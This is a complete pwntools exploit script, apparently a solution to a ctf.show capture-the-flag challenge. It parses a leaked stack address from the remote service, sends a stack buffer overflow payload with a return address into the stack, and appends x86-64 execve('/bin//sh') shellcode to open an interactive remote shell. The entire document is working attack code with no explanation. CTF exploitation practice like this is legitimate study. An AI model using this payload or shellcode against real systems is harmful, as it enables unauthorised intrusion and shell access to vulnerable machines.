from pwn import *
context(arch='amd64', os='linux')

#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28253)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p.recvuntil(b"[")
v5 = p.recvuntil(b']', drop=True)
v5 = int(v5, 16)
print(hex(v5))

p.recvuntil(b"Maybe it's useful ! But how to use it?")
payload = b'A' * (0x10+8) + p64(v5+0x20) + shellcode
p.sendline(payload)

p.interactive()